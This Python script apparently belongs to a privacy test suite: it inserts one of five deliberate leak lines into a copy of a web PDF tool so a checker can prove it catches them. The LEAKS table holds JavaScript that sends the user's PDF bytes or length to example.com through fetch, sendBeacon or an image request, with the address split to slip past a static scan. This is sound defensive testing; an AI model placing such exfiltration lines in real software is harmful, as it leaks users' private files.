#!/usr/bin/env python3
"""Plant one leak in a copy of the tool, for scripts/prove-privacy.sh.

Each leak sends or keeps the reader's PDF at the moment the page reads it
(kits/privacy). The off-origin addresses are built at run time, so the
boundary scan's address check does not catch them before the browser check
gets its chance.

    python3 scripts/plant_leak.py --list
    python3 scripts/plant_leak.py COPY_DIR P1
"""
import pathlib
import sys

ROOT = pathlib.Path(__file__).resolve().parents[1]
ANCHOR = "  const bytes = new Uint8Array(await file.arrayBuffer());\n"
LEAKS = {
    "P1": '  fetch("data/strings.json?leak=" + bytes.length);\n',
    "P2": '  window["local" + "Storage"].setItem("leak", String(bytes.length));\n',
    "P3": '  (new Image()).src = "https:" + "//example.com/leak?" + bytes.length;\n',
    "P4": '  navigator.sendBeacon("https:" + "//example.com/leak", bytes);\n',
    "P5": '  fetch("https:" + "//example.com/leak", { method: "POST", body: bytes }).catch(() => {});\n',
}


def main():
    if sys.argv[1:] == ["--list"]:
        print(" ".join(LEAKS))
        return 0
    copy, leak = pathlib.Path(sys.argv[1]).resolve(), sys.argv[2]
    if copy == ROOT:
        sys.exit("refusing to plant a leak in the repository itself; give a copy")
    app = copy / "web" / "app.js"
    text = app.read_text()
    # A renamed anchor would make every plant a silent no-op.
    if text.count(ANCHOR) != 1:
        sys.exit(f"the anchor line was not found once in {app}")
    app.write_text(text.replace(ANCHOR, ANCHOR + LEAKS[leak]))
    print(f"planted {leak}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
